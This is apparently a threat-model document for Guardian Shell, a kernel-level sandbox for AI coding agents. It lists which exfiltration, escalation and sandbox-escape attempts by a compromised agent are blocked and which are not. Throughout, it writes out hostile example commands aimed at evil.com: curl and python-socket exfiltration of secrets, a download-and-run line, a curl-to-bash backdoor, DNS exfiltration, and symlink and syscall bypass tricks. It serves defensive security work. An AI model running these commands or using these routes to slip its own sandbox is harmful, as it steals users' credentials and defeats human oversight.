# Guardian Shell — User Scenarios & Threat Model

**Date:** 2026-03-23
**Version:** 0.11.0 (Phase 11)

This document evaluates Guardian Shell from a real user's perspective: what it
fully protects, what it partially protects, and where a compromised AI agent
can still cause harm.

---

## Table of Contents

1. [Setup: The User](#1-setup-the-user)
2. [Feature: read_only Policy](#2-feature-read_only-policy)
3. [Fully Protected Scenarios](#3-fully-protected-scenarios)
4. [Partially Protected Scenarios](#4-partially-protected-scenarios)
5. [Not Protected Scenarios](#5-not-protected-scenarios)
6. [Agent Bypass Techniques](#6-agent-bypass-techniques-what-a-smart-agent-could-try)
7. [Recommended Config for Real Users](#7-recommended-config-for-real-users)
8. [Summary Matrix](#8-summary-matrix)

---

## 1. Setup: The User

**Profile:** A developer who uses an AI coding agent (Claude Code, Aider, Codex)
on their Fedora/Ubuntu laptop to build applications.

**Directory layout:**
```
/home/dev/
├── projects/
│   ├── webapp/          ← Active project, agent works here
│   ├── api-server/      ← Another project
│   ├── confidential/    ← Client data, MUST NOT be accessed
│   └── files/           ← Reference docs, agent can read but NOT delete
├── .ssh/                ← SSH keys
├── .aws/                ← AWS credentials
├── .gnupg/              ← GPG keys
├── .config/gcloud/      ← GCP credentials
├── .docker/             ← Docker auth
├── .kube/               ← Kubernetes config
└── .bashrc, .profile    ← Shell configs
```

**Config:**
```toml
[[agents]]
name = "code-agent"
identity = "cgroup"

[agents.file_access]
default = "deny"
allow = [
    "/home/dev/projects/webapp/**",
    "/home/dev/projects/api-server/**",
    "/home/dev/.local/**",
    "/home/dev/.cache/**",
    "/home/dev/.config/**",
    "/home/dev/.npm/**",
    "/home/dev/.cargo/**",
    "/home/dev/.bashrc",
    "/home/dev/.profile",
    "/tmp/**",
    "/proc/**", "/sys/**", "/dev/**", "/run/**", "/var/**",
    "/usr/lib/**", "/usr/lib64/**", "/usr/libexec/**",
    "/usr/share/**", "/usr/local/**",
    "/usr/bin/**", "/usr/sbin/**", "/sbin/**",
    "/lib/**", "/lib64/**", "/bin/**",
    "/etc/**",
]
deny = [
    "/home/dev/projects/confidential/**",
    "/home/dev/.ssh/**",
    "/home/dev/.aws/**",
    "/home/dev/.gnupg/**",
    "/home/dev/.config/gcloud/**",
    "/home/dev/.docker/**",
    "/home/dev/.kube/**",
    "/etc/shadow",
    "/etc/gshadow",
]
read_only = [
    "/home/dev/projects/files/**",
]

[agents.exec_policy]
default = "allow"
deny = ["/usr/bin/ssh", "/usr/bin/scp", "/usr/bin/rsync"]

[agents.network_policy]
default = "allow"
deny_ports = [22, 25]
```

**Launch:**
```bash
sudo RUST_LOG=info target/release/guardian --config config.toml
sudo target/release/guardian-launch --name code-agent -- claude
```

---

## 2. Feature: read_only Policy

Phase 11 adds `read_only` to the file access policy. Paths in this list can be
**read** but not **deleted, renamed, or hardlinked**.

**Enforcement (two layers):**

| Operation | eBPF Hook | read_only Behavior |
|-----------|-----------|-------------------|
| `openat()` (read) | `file_open` LSM | **ALLOWED** — evaluate_policy treats read_only as allowed |
| `openat()` (write) | `file_open` LSM | **ALLOWED by eBPF** (can't distinguish mode), **BLOCKED by Landlock** (ReadFile only, no WriteFile) |
| `unlinkat()` (delete) | `inode_unlink` LSM | **BLOCKED** — is_readonly() check in tracepoint sets PENDING_UNLINK_DENY |
| `renameat2()` (move) | `inode_rename` LSM | **BLOCKED** — is_readonly() check in tracepoint sets PENDING_RENAME_DENY |
| `linkat()` (hardlink) | `inode_link` LSM | **BLOCKED** — is_readonly() check in tracepoint sets PENDING_LINK_DENY |

**Example:**
```toml
read_only = ["/home/dev/projects/files/**"]
```

```bash
# Inside the sandboxed agent:
cat /home/dev/projects/files/readme.txt    # ALLOWED (read)
rm /home/dev/projects/files/readme.txt     # BLOCKED (delete → inode_unlink denied)
mv /home/dev/projects/files/a.txt b.txt    # BLOCKED (rename → inode_rename denied)
echo "x" > /home/dev/projects/files/a.txt  # BLOCKED by Landlock (no WriteFile right)
```

---

## 3. Fully Protected Scenarios

These scenarios are **completely blocked** with no known bypass for cgroup agents:

### 3.1 Agent Tries to Read SSH Keys

```bash
cat /home/dev/.ssh/id_rsa
```

| Layer | Result |
|-------|--------|
| eBPF `file_open` | BLOCKED — matches deny rule `/home/dev/.ssh/**` |
| Landlock | BLOCKED — path not in Landlock allow rules |

**Bypass attempt — symlink:**
```bash
ln -s /home/dev/.ssh/id_rsa /tmp/innocent.txt
cat /tmp/innocent.txt
```

| Layer | Result |
|-------|--------|
| Landlock | BLOCKED — resolves symlink to `/home/dev/.ssh/id_rsa` inode, not in allow set |
| eBPF | Would see `/tmp/innocent.txt` (allowed), but Landlock blocks first |

**Verdict: FULLY PROTECTED.** Landlock's inode-level resolution defeats symlink attacks.

---

### 3.2 Agent Tries to Read Confidential Directory

```bash
cat /home/dev/projects/confidential/client-data.csv
```

| Layer | Result |
|-------|--------|
| eBPF `file_open` | BLOCKED — deny rule `/home/dev/projects/confidential/**` overrides allow rule `/home/dev/projects/webapp/**` |
| Landlock | BLOCKED — deny takes precedence in policy evaluation |

**Bypass attempt — path traversal:**
```bash
cat /home/dev/projects/webapp/../../projects/confidential/data.csv
```

| Layer | Result |
|-------|--------|
| eBPF | Path normalized by `normalize_path()` → `/home/dev/projects/confidential/data.csv` → DENIED |
| Landlock | Kernel resolves to inode of confidential/data.csv → not separately allowed → DENIED |

**Verdict: FULLY PROTECTED.**

---

### 3.3 Agent Tries to Escalate to Root

```bash
sudo bash                    # Attempt 1: sudo
su root                      # Attempt 2: su
mount -t proc proc /mnt      # Attempt 3: mount
unshare -n bash               # Attempt 4: namespace
chroot /tmp bash              # Attempt 5: chroot
```

| Layer | Result |
|-------|--------|
| PR_SET_NO_NEW_PRIVS | sudo/su SUID bits ignored — can't gain privileges |
| Seccomp | mount(165), unshare(272), setns(308), chroot(161), pivot_root(155) → EPERM |
| Privilege drop | Agent runs as uid=1000, not root |

**Bypass attempt — io_uring:**
```bash
# Attempt to use io_uring to bypass seccomp
python3 -c "import ctypes; ctypes.CDLL(None).syscall(425, ...)"
```

| Layer | Result |
|-------|--------|
| Seccomp | io_uring_setup(425), io_uring_enter(426), io_uring_register(427) → EPERM |

**Bypass attempt — memfd_create + execveat:**
```bash
# Attempt fileless execution
python3 -c "import ctypes; fd = ctypes.CDLL(None).syscall(319, b'x', 0)"
```

| Layer | Result |
|-------|--------|
| Seccomp | memfd_create(319) → EPERM |
| eBPF | `/memfd:*` exec unconditionally denied |

**Verdict: FULLY PROTECTED.** Four independent layers block all escalation paths.

---

### 3.4 Agent Tries to Delete Read-Only Files

```bash
rm /home/dev/projects/files/important-doc.pdf
mv /home/dev/projects/files/doc.txt /tmp/stolen.txt
ln /home/dev/projects/files/doc.txt /tmp/copy.txt
```

| Layer | Result |
|-------|--------|
| eBPF `inode_unlink` | BLOCKED — is_readonly() returns true, PENDING_UNLINK_DENY set |
| eBPF `inode_rename` | BLOCKED — is_readonly() returns true, PENDING_RENAME_DENY set |
| eBPF `inode_link` | BLOCKED — is_readonly() returns true, PENDING_LINK_DENY set |
| Landlock | read_only paths get ReadFile\|ReadDir only — no RemoveFile/MakeReg rights |

**Verdict: FULLY PROTECTED.** Both eBPF and Landlock enforce read-only independently.

---

### 3.5 Agent Tries to SSH to External Server

```bash
ssh attacker@evil.com
scp /home/dev/projects/webapp/secrets.json attacker@evil.com:
```

| Layer | Result |
|-------|--------|
| eBPF exec policy | `/usr/bin/ssh` and `/usr/bin/scp` in exec deny list → BLOCKED |
| eBPF network | Port 22 in deny_ports → `socket_connect` LSM returns -ECONNREFUSED |

**Verdict: FULLY PROTECTED** (when SSH is in deny list and port 22 is denied).

---

### 3.6 Agent Tries to Modify System Files

```bash
echo "malicious" >> /etc/hosts
echo "backdoor" >> /etc/crontab
cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell
```

| Layer | Result |
|-------|--------|
| Landlock | `/etc` has ReadFile\|ReadDir only — no WriteFile right → EACCES |
| File permissions | Agent runs as uid=1000 — can't write root-owned `/etc/*` |
| Landlock | `/bin` has ReadFile\|ReadDir only → EACCES |
| NNP | chmod +s is meaningless — NNP prevents SUID from granting privileges |

**Verdict: FULLY PROTECTED.** Landlock + file permissions + NNP.

---

### 3.7 Shell Syntax Tricks (Snowflake Cortex Attack)

```bash
cat < <(sh < <(wget -qO- https://evil.com/malware))
eval "$(echo bWFsaWNpb3Vz | base64 -d)"
```

| Layer | Result |
|-------|--------|
| eBPF `sys_enter_execve` | Catches `sh`, `wget` execve syscalls regardless of shell syntax |
| eBPF `sys_enter_connect` | Catches `connect()` to evil.com regardless of how invoked |
| Cgroup | All child processes (sh, wget) inherit cgroup — can't escape monitoring |

**Verdict: FULLY PROTECTED.** Kernel sees syscalls, not shell strings.

---

### 3.8 Agent Tries to Escape Cgroup

```bash
echo $$ > /sys/fs/cgroup/user.slice/cgroup.procs  # Move self to different cgroup
```

| Layer | Result |
|-------|--------|
| File permissions | Agent is non-root — can't write to cgroup filesystem |
| Seccomp | If somehow attempted via mount: mount(165) blocked |

**Verdict: FULLY PROTECTED.** Cgroup escape requires root.

---

## 4. Partially Protected Scenarios

These scenarios have **some protection but known gaps**:

### 4.1 Agent Writes to Read-Only Files via openat(O_WRONLY)

```bash
echo "overwritten" > /home/dev/projects/files/doc.txt
python3 -c "open('/home/dev/projects/files/doc.txt','w').write('pwned')"
```

| Layer | Result |
|-------|--------|
| eBPF `file_open` | ALLOWED — eBPF `evaluate_policy()` treats read_only as allowed, doesn't check O_WRONLY flags |
| Landlock | **BLOCKED** — read_only paths get ReadFile\|ReadDir only (no WriteFile) |

**Net result: BLOCKED for cgroup agents** (Landlock catches it), but comm-based
(Tier 2) agents are vulnerable — eBPF alone can't distinguish read vs write opens.

**Verdict: PROTECTED for cgroup agents (Landlock). VULNERABLE for comm-based agents.**

---

### 4.2 Agent Exfiltrates Data via HTTPS

```bash
curl -X POST https://evil.com/exfil -d @/home/dev/projects/webapp/secrets.json
```

| Layer | Result |
|-------|--------|
| eBPF network | Port 443 is NOT in deny list (needed for npm, pip, API calls) → ALLOWED |
| eBPF `file_open` | `/home/dev/projects/webapp/secrets.json` is in allow list → ALLOWED |

The agent reads an allowed file and sends it to an allowed port. Guardian Shell
logs the connection (visible in dashboard) but doesn't block it.

**Verdict: PARTIALLY PROTECTED.** The activity is logged and visible, but not
blocked. To block specific destinations, you'd need IP-based or domain-based
network policy (not yet implemented — DNS is unmonitored).

**Mitigation:** Deny port 443 and only allow specific ports via `allow_ports`.
But this breaks most agent workflows (npm install, pip install, API calls).

---

### 4.3 Agent Reads Allowed File That Contains Secrets

```bash
cat /home/dev/projects/webapp/.env
cat /home/dev/projects/webapp/config/database.yml
```

| Layer | Result |
|-------|--------|
| eBPF | `/home/dev/projects/webapp/**` is allowed → ALLOWED |
| Landlock | webapp is in allow rules → ALLOWED |

The agent has legitimate access to the project directory. If the project contains
`.env` files, database credentials, or API keys, the agent can read them.

**Verdict: NOT PROTECTED by Guardian Shell.** This is a policy configuration
issue. The user should add `.env` files to the deny list:

```toml
deny = [
    "/home/dev/projects/webapp/.env",
    "/home/dev/projects/webapp/.env.local",
    "/home/dev/projects/api-server/.env",
]
```

---

### 4.4 Agent Introduces Backdoor in Code

```python
# Agent modifies webapp/app.py to add:
import subprocess
subprocess.Popen(["curl", "https://evil.com/backdoor.sh", "|", "bash"])
```

| Layer | Result |
|-------|--------|
| eBPF `file_open` | Writing to `/home/dev/projects/webapp/app.py` → ALLOWED (project is writable) |
| eBPF exec | When the backdoor runs later, `curl` and `bash` would be caught |
| Human review | The backdoor is in a file the human can review via git diff |

**Verdict: PARTIALLY PROTECTED.** Guardian Shell can't analyze code content for
malicious intent. But it WILL block the backdoor when it executes (if curl/bash
are denied or network policy blocks the connection). The code modification is
logged and visible in the event stream.

**Mitigation:** Use `read_only` for critical source files that the agent shouldn't
modify, and review all agent-written code before running it.

---

### 4.5 Agent Pivots via Allowed Tools

```bash
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('evil.com', 443))
s.send(open('/home/dev/projects/webapp/secrets.json').read().encode())
"
```

| Layer | Result |
|-------|--------|
| eBPF exec | `python3` is allowed → ALLOWED |
| eBPF `file_open` | `secrets.json` is in project allow list → ALLOWED |
| eBPF `connect` | Port 443 is allowed → ALLOWED |

The agent uses an allowed interpreter (python3) with allowed file access and
allowed network access. All operations are individually legitimate but combined
they enable exfiltration.

**Verdict: NOT PROTECTED.** This is the fundamental challenge of AI agent
security: distinguishing legitimate tool use from malicious intent.

---

## 5. Not Protected Scenarios

These scenarios have **no protection** in Guardian Shell:

### 5.1 DNS-Based Data Exfiltration

```bash
# Encode secret in DNS queries
nslookup $(cat /home/dev/projects/webapp/.env | base64 | head -c 60).evil.com
```

| Layer | Result |
|-------|--------|
| eBPF network | DNS uses UDP port 53 — `sendto()` without `connect()` bypasses eBPF |
| Landlock | Landlock TCP filtering only — UDP is not enforced |

**Verdict: NOT PROTECTED.** DNS/UDP is unmonitored (Known Limitation #18, #19).

---

### 5.2 Timing-Based Side Channels

```bash
# Encode data in response timing
for bit in $(cat secret | xxd -p); do
    if [ "$bit" = "1" ]; then sleep 0.1; fi
    curl https://allowed-api.com/ping
done
```

| Layer | Result |
|-------|--------|
| All | Allowed API, allowed network — timing patterns not analyzed |

**Verdict: NOT PROTECTED.** Side-channel analysis is out of scope.

---

### 5.3 Social Engineering via Code Comments

```python
# Agent writes code with misleading comments:
# IMPORTANT: Run this script as root for database migrations
# sudo python3 migrate.py
```

| Layer | Result |
|-------|--------|
| All | Agent can write to allowed project files — content analysis not performed |

**Verdict: NOT PROTECTED.** Guardian Shell protects system resources, not human
decision-making.

---

### 5.4 Clipboard / Terminal Escape Sequences

```bash
# Agent outputs terminal escape sequences to manipulate display
echo -e "\033]0;sudo rm -rf /\007"  # Change terminal title
echo -e "\033[2J"                     # Clear screen
```

| Layer | Result |
|-------|--------|
| All | Terminal output is not monitored — escape sequences pass through |

**Verdict: NOT PROTECTED.** Terminal manipulation is out of scope.

---

### 5.5 Slow Data Accumulation in Allowed Locations

```bash
# Agent slowly copies sensitive data to /tmp over many sessions
cp /home/dev/projects/webapp/secrets.json /tmp/.cache-$(date +%s)
```

| Layer | Result |
|-------|--------|
| eBPF | `/tmp/**` is in allow list → ALLOWED |
| eBPF | `/home/dev/projects/webapp/**` is in allow list → ALLOWED |
| Audit log | Event is logged, but no alerting on accumulation patterns |

**Verdict: PARTIALLY PROTECTED.** The action is logged (visible in dashboard
and audit trail), and the anomaly detection system may flag unusual patterns,
but there's no automatic blocking of "allowed-to-allowed" copies.

---

## 6. Agent Bypass Techniques (What a Smart Agent Could Try)

### 6.1 Attempts That WILL Fail

| Technique | Why It Fails |
|-----------|-------------|
| `ln -s /home/dev/.ssh/id_rsa /tmp/x && cat /tmp/x` | Landlock resolves symlinks at inode level |
| `cat /proc/self/root/home/dev/.ssh/id_rsa` | `normalize_path()` strips `/proc/self/root/` |
| `openat(AT_FDCWD, "../../../.ssh/id_rsa")` | eBPF `sys_enter_openat` + path normalization |
| `openat2()` with RESOLVE_NO_SYMLINKS | eBPF `sys_enter_openat2` tracepoint hooks it |
| Process substitution `cat < <(sh < <(...))` | eBPF sees actual `execve()` syscalls, not shell syntax |
| `memfd_create()` + `execveat()` for fileless exec | Seccomp blocks `memfd_create(319)` |
| `io_uring_setup()` to bypass syscall hooks | Seccomp blocks `io_uring_setup(425)` |
| Rename `/etc/shadow` to bypass deny | eBPF `inode_rename` LSM blocks rename of denied paths |
| Hardlink `/etc/shadow` to `/tmp/safe` | eBPF `inode_link` LSM blocks link of denied paths |
| `mount --bind /home/dev/.ssh /tmp/x` | Seccomp blocks `mount(165)` |
| `unshare -n` to create network namespace | Seccomp blocks `unshare(272)` |
| `chroot /tmp` to escape filesystem view | Seccomp blocks `chroot(161)` |
| Run SUID binary to gain root | `PR_SET_NO_NEW_PRIVS` prevents SUID escalation |
| Spawn processes outside cgroup | Cgroup is inherited by all children — no escape |
| Modify eBPF maps from userspace | Requires `CAP_BPF` — agent has no capabilities |
| Kill the guardian daemon | Agent is non-root — can't signal root processes |

### 6.2 Attempts That MIGHT Succeed

| Technique | Why It Might Work | Mitigation |
|-----------|------------------|------------|
| Read `.env` in allowed project dir | File is in the allow path | Add `.env` to deny list |
| `curl https://evil.com -d @allowed-file` | Port 443 + allowed file | Deny 443, use allow_ports only |
| DNS exfil via `nslookup secret.evil.com` | UDP unmonitored | Known limitation — no fix yet |
| Write backdoor in allowed source file | Agent has write access to project | Use `read_only` for critical files |
| Read `/etc/passwd` for user enumeration | `/etc/**` is in allow list | Acceptable — `/etc/passwd` is world-readable |
| Use python/node to open raw sockets | Interpreter is allowed | Seccomp could block `socket(SOCK_RAW)` — not currently done |
| Time delays to encode data | Allowed operations with timing | Out of scope |
| Write misleading code comments | Can write to project files | Human code review |

### 6.3 Attempts That WILL Succeed (Architecture Gaps)

| Technique | Why It Works | Priority to Fix |
|-----------|-------------|-----------------|
| Use bundled tools instead of system binaries | Agent ships its own `rg`, `node`, etc. in allowed dirs | HIGH — see Section 6.4 |
| UDP `sendto()` without prior `connect()` | No eBPF hook for `sendto` | HIGH — needs sendto/sendmsg tracepoint |
| DNS queries encoding exfiltrated data | DNS is unmonitored UDP | HIGH — needs DNS interception |
| Read allowed file + send via allowed HTTPS | Both operations individually allowed | MEDIUM — needs content/DLP analysis |
| `openat(O_WRONLY)` on read_only path (comm agent) | eBPF can't distinguish read/write mode | LOW — Landlock blocks for cgroup agents |

### 6.4 Bundled Tools Bypass Exec Deny (Real-World Finding)

**Discovered during live testing with Claude Code on Fedora 43.**

Claude Code bundles its own `rg` (ripgrep) binary inside its npm package:

```
~/.local/share/mise/installs/node/24.1.0/lib/node_modules/
  @anthropic-ai/claude-code/vendor/ripgrep/x64-linux/rg
```

When `/usr/bin/grep` is in the exec deny list, the system `grep` IS blocked —
but Claude never calls it. Instead, it uses its bundled `rg` which lives under
`~/.local/**` (an allowed path). The exec deny rule is completely bypassed.

**Why this matters:**
- Modern AI agents are self-contained — they bundle their own tools
- Exec deny rules only work for system binaries the agent actually calls
- If the agent's allowed directory contains executables, those are always available
- This is NOT a bug in Guardian Shell — it's a fundamental limitation of
  path-based exec policy when the agent controls its own tool directory

**Mitigations:**
1. **Deny the vendor directory**: Add the agent's bundled binary paths to deny
   ```toml
   deny = [
       "/home/user/.local/share/mise/installs/node/*/lib/node_modules/@anthropic-ai/claude-code/vendor/**",
   ]
   ```
   But this breaks the agent — it needs its tools to function.

2. **Use `read_only` for the vendor directory**: Allow reading but prevent
   the agent from replacing bundled tools with malicious versions
   ```toml
   read_only = [
       "/home/user/.local/share/mise/installs/node/*/lib/node_modules/@anthropic-ai/claude-code/vendor/**",
   ]
   ```

3. **Accept the limitation**: If the agent needs search capability to function,
   blocking `grep`/`rg` defeats its purpose. Focus deny rules on truly dangerous
   binaries (`ssh`, `curl`, `wget`, `nc`, `docker`, `kubectl`).

4. **Use network policy as the real control**: Even if the agent can run any tool,
   it can't exfiltrate data if outbound connections are blocked on dangerous ports.

---

## 6.5 Issues Discovered During Real-World Testing

These issues were found during hands-on testing with Claude Code on Fedora 43
and are now fixed or documented:

### 6.5.1 O_PATH Opens Create Stale PENDING_DENY (Fixed in Phase 11)

Landlock's `PathFd::new()` opens paths with `O_PATH` flag. The eBPF
`sys_enter_openat` tracepoint fires for these opens and may insert a
PENDING_DENY entry. But `O_PATH` opens do NOT trigger the `file_open` LSM
hook (kernel optimization). The stale PENDING_DENY entry is consumed by the
NEXT real `file_open` — which could be the exec binary — causing false EACCES.

**Impact:** Landlock + exec completely broken. Every exec after `restrict_self()`
failed with "Permission denied".

**Fix:** Check `O_PATH` flag (`0x200000`) in all openat tracepoints. Skip
PENDING_DENY insertion for O_PATH opens.

### 6.5.2 Stale eBPF Scratch Buffer Breaks Exact Match (Fixed in Phase 11)

PerCpuArray scratch buffers (`EVENT_BUF`, `EXEC_BUF`) persist between eBPF
calls. When `bpf_probe_read_user_str_bytes` writes a shorter filename (e.g.,
`/usr/bin/grep\0`), stale bytes from a previous longer filename remain after the
null terminator. BPF HashMap EXACT lookups compare all 256 bytes — the stale
suffix causes the lookup to fail.

**Impact:** Exec deny rules for specific binaries (like `/usr/bin/grep`) were
never matched. The deny was in the map but the lookup key didn't match due to
stale trailing bytes.

**Fix:** Zero the `event.filename` buffer before every
`bpf_probe_read_user_str_bytes` call across all 5 tracepoints.

### 6.5.3 Binary Path Symlinks on Merged-usr Systems (Fixed in Phase 11)

On Fedora/Arch (merged-usr), `/bin` → `/usr/bin`, `/sbin` → `/usr/sbin`.
Additionally, `/usr/bin` and `/usr/sbin` may both contain the same binary.
A deny rule for `/usr/bin/grep` does NOT block `/bin/grep`, `/usr/sbin/grep`,
or `/sbin/grep` — because eBPF sees the raw syscall path string.

**Impact:** Deny rules ineffective when shell uses a different PATH entry.
User denies `/usr/bin/grep` but shell runs `/usr/sbin/grep`.

**Fix:** `symlink_alternates()` function auto-generates deny entries for all
`/usr/bin`, `/bin`, `/usr/sbin`, `/sbin`, `/usr/local/bin` variants. Deny
rule for `/usr/bin/grep` now also denies `/bin/grep`, `/usr/sbin/grep`, `/sbin/grep`.

### 6.5.4 Landlock + exec Fails as Root on SELinux (Fixed in Phase 11)

`landlock_restrict_self()` + `execve()` returns EACCES when running as root
on Fedora kernels with SELinux enforcing. No SELinux AVC denial logged.
Works fine as non-root.

**Fix:** Drop root privileges to `SUDO_UID`/`SUDO_GID` after cgroup setup
but before Landlock + exec. See `docs/landlock-exec-investigation.md`.

### 6.5.5 Config Changes Require Daemon Restart (Known Limitation)

Editing deny/allow rules in `config.toml` or via the dashboard does NOT update
BPF enforcement maps. Maps are populated once at daemon startup. SIGHUP reloads
the in-memory config (for new agent registrations) but does NOT re-populate
existing BPF maps.

**Impact:** User adds deny rule, agent is still allowed. False sense of security.

**Mitigation:** Dashboard policy update toast now warns "Restart the daemon for
deny/allow changes to take effect." Future work: hot-reload BPF maps on SIGHUP.

### 6.5.6 config.toml with Placeholder Paths (Usability)

The example `config.toml` had `/home/user` placeholder paths. Users who copy
this without replacing with their actual username get non-existent paths.
Landlock silently skips rules for non-existent paths (DEBUG log only), leaving
the agent with almost no Landlock enforcement.

**Fix:** `config.toml` is now gitignored. `config.toml.example` has placeholders
with a one-liner sed command. Auto-created default configs use `SUDO_USER` to
infer the real home directory.

### 6.5.7 Shell Init Requires Broad /etc Access (Design Tradeoff)

Fedora bash startup sources many files: `/etc/bashrc`, `/etc/profile`,
`/etc/profile.d/**`, `/etc/inputrc`, `/usr/libexec/grepconf.sh`, etc. Each
distro has different files. Enumerating them individually is fragile.

**Tradeoff:** Landlock allows `/etc` read access broadly. eBPF deny rules
protect sensitive files (`/etc/shadow`, `/etc/gshadow`). This means Landlock
alone doesn't deny `/etc/shadow` — the eBPF layer is required.

### 6.5.8 htmx 2.0 Doesn't Swap Error Responses (Fixed in Phase 11)

htmx 2.0 changed default behavior: 4xx/5xx responses are NOT swapped into the
target element. Dashboard notifications (toast messages) were silently
discarded for errors, CSRF rejections, and validation failures.

**Fix:** Added `htmx:beforeSwap` event listener in `base.html` that forces
swap for all response codes. CSRF middleware now returns HTML toast div instead
of plain text, so errors display correctly in the toast area.

---

## 7. Recommended Config for Real Users

### Developer Using Claude Code / Aider

```toml
[global]
mode = "enforce"
socket_path = "/run/guardian.sock"

[dashboard]
enabled = true
listen_address = "127.0.0.1:8080"
auth_token = "generate-a-random-token-here"

[[agents]]
name = "code-agent"
identity = "cgroup"

[agents.file_access]
default = "deny"
allow = [
    # YOUR project(s) — add each project explicitly
    "/home/YOU/projects/myapp/**",

    # Tool configs and caches
    "/home/YOU/.local/**",
    "/home/YOU/.cache/**",
    "/home/YOU/.config/**",
    "/home/YOU/.npm/**",
    "/home/YOU/.cargo/**",
    "/home/YOU/.bashrc",
    "/home/YOU/.profile",
    "/home/YOU/.zshrc",

    # System (required for shell init, dynamic linking)
    "/tmp/**", "/proc/**", "/sys/**", "/dev/**", "/run/**", "/var/**",
    "/usr/lib/**", "/usr/lib64/**", "/usr/libexec/**",
    "/usr/share/**", "/usr/local/**",
    "/usr/bin/**", "/usr/sbin/**", "/sbin/**",
    "/lib/**", "/lib64/**", "/bin/**",
    "/etc/**",
]
deny = [
    # Project secrets
    "/home/YOU/projects/myapp/.env",
    "/home/YOU/projects/myapp/.env.local",
    "/home/YOU/projects/myapp/.env.production",

    # Sensitive directories
    "/home/YOU/projects/confidential/**",

    # Credentials (NEVER allow these)
    "/home/YOU/.ssh/**",
    "/home/YOU/.aws/**",
    "/home/YOU/.gnupg/**",
    "/home/YOU/.config/gcloud/**",
    "/home/YOU/.docker/**",
    "/home/YOU/.kube/**",

    # System secrets
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/sudoers",
    "/etc/sudoers.d/**",
]
read_only = [
    # Reference docs the agent can read but not modify
    "/home/YOU/projects/docs/**",
    "/home/YOU/projects/specs/**",
]

[agents.exec_policy]
default = "allow"
deny = [
    "/usr/bin/ssh",
    "/usr/bin/scp",
    "/usr/bin/rsync",
    "/usr/bin/docker",
    "/usr/bin/kubectl",
    "/usr/bin/podman",
]

[agents.network_policy]
default = "allow"
deny_ports = [22, 25, 3306, 5432, 6379, 27017]
# Blocks: SSH, SMTP, MySQL, PostgreSQL, Redis, MongoDB
# Allows: HTTP(80), HTTPS(443) for npm/pip/API calls
```

### Launch:
```bash
# Start daemon
sudo RUST_LOG=info target/release/guardian --config config.toml

# Launch agent with cgroup isolation
sudo target/release/guardian-launch --name code-agent -- claude

# Monitor in browser
open http://127.0.0.1:8080
```

---

## 8. Summary Matrix

### Protection Level by Attack Category

| Category | Protection | Confidence | Notes |
|----------|-----------|------------|-------|
| **Credential theft** (SSH, AWS, GCP keys) | FULL | Very High | Deny rules + Landlock inode resolution defeats symlinks |
| **Root escalation** | FULL | Very High | 4 layers: privilege drop + NNP + seccomp + non-root |
| **Confidential directory access** | FULL | Very High | Deny rules override allow rules at both eBPF and Landlock |
| **System file modification** | FULL | Very High | Landlock read-only + non-root file permissions |
| **Read-only file deletion** | FULL | High | eBPF inode_unlink/rename/link + Landlock ReadFile only |
| **Shell syntax tricks** | FULL | Very High | Kernel syscall interception, not shell parsing |
| **io_uring / memfd bypass** | FULL | Very High | Seccomp blocks at syscall level |
| **Cgroup escape** | FULL | Very High | Kernel-enforced, requires root to modify |
| **Namespace / mount escape** | FULL | Very High | Seccomp blocks unshare/mount/chroot/pivot_root |
| **SUID escalation** | FULL | Very High | PR_SET_NO_NEW_PRIVS irremovable |
| **Symlink / TOCTOU attacks** | FULL (cgroup) | High | Landlock inode-level. Comm agents still vulnerable |
| **Read-only file write via openat** | FULL (cgroup) | High | Landlock blocks. Comm agents: eBPF gap |
| **Exec deny for system binaries** | FULL | High | Auto-covers /usr/bin, /bin, /usr/sbin, /sbin variants |
| **Exec deny for bundled agent tools** | NONE | N/A | Agent ships own `rg`/tools in allowed dirs — see 6.4 |
| **Data exfil via HTTPS** | PARTIAL | Low | Logged but not blocked if port 443 allowed |
| **Allowed-file secrets** (.env) | PARTIAL | Medium | Depends on deny list completeness |
| **Code backdoor injection** | PARTIAL | Low | Logged, but content not analyzed |
| **Config changes without restart** | NONE | N/A | BPF maps loaded at startup only — see 6.5.5 |
| **DNS data exfiltration** | NONE | N/A | UDP unmonitored |
| **Timing side channels** | NONE | N/A | Out of scope |
| **Social engineering via output** | NONE | N/A | Out of scope |

### Security Layer Effectiveness

| Layer | What It Stops | What It Can't Stop |
|-------|-------------|-------------------|
| **Landlock** | Symlink attacks, inode-level file deny, read-only enforcement | UDP, network by IP, code content |
| **Seccomp** | io_uring, memfd, mount, namespace, chroot, pivot_root | Allowed syscalls with bad intent |
| **eBPF LSM** | File access, exec, network connect, rename, delete, link | UDP sendto, write-mode distinction |
| **Cgroup** | Process escape, resource exhaustion | Nothing — kernel-enforced |
| **NNP** | SUID escalation | Nothing — kernel-enforced |
| **Privilege drop** | Root actions, Landlock+SELinux fix | Agent still has user-level access |
| **Rate limiting** | Permission flooding, approval fatigue | Allowed operations |
| **Risk classification** | Reflexive approval of high-risk requests | Low-risk but dangerous operations |

---

## 9. Bugs Found & Fixed During Live Testing

| Bug | Severity | Impact | Fix | Section |
|-----|----------|--------|-----|---------|
| O_PATH stale PENDING_DENY | CRITICAL | ALL exec fails after Landlock restrict_self() | Skip O_PATH in tracepoints | 6.5.1 |
| Stale eBPF scratch buffer | CRITICAL | Exec deny exact match never works | Zero buffer before read | 6.5.2 |
| Landlock+exec EACCES as root | CRITICAL | Landlock unusable on Fedora/SELinux | Drop privileges before Landlock | 6.5.4 |
| Binary symlink paths | HIGH | Deny /usr/bin/grep doesn't block /bin/grep | symlink_alternates() covers all dirs | 6.5.3 |
| htmx 2.0 silent error | MEDIUM | Dashboard shows no notification on error | Force swap for 4xx/5xx responses | 6.5.8 |
| config.toml placeholder paths | MEDIUM | Landlock silently skips non-existent paths | .gitignore + config.toml.example | 6.5.6 |
| BPF maps not reloaded on config change | LOW | Deny rules don't take effect until restart | Dashboard warns to restart | 6.5.5 |
| Bundled tools bypass exec deny | DESIGN | Agent's own rg/tools always accessible | Document limitation + mitigations | 6.4 |

---

## References

- [Comprehensive Code Analysis](security/comprehensive-code-analysis.md)
- [Snowflake Cortex Comparison](security/snowflake-cortex-sandbox-escape-analysis.md)
- [Landlock Investigation](landlock-exec-investigation.md)
- [Phase 11 Implementation](phase_11_security_hardening.md)
- [Security Limitations](security/security-limitations.md)
